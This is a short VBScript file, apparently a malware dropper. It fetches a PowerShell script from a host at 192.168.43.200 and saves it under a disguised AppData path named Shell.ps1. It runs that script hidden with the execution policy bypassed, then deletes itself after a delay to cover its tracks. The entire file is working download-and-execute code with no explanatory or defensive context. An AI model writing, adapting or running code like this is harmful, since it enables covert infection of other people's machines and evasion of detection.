' downloader_and_executor.vbs
Option Explicit

Dim url, savePath, http, stream, shell, thisScriptPath

' PowerShell script to download
url = "http://192.168.43.200:8080/N.ps1"
savePath = "C:\Users\shiva\AppData\Local\Microsoft\Windows\Shell\Shell.ps1"

' Get current VBScript file path
thisScriptPath = WScript.ScriptFullName

' Download the PowerShell script
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", url, False
http.Send

If http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' binary
    stream.Open
    stream.Write http.ResponseBody
    stream.SaveToFile savePath, 2
    stream.Close

    ' Run the downloaded PowerShell script silently
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & savePath & """", 0, False

    ' Schedule this VBScript for deletion after a delay
    shell.Run "cmd /c ping -n 3 127.0.0.1 > nul & del """ & thisScriptPath & """", 0, False
End If
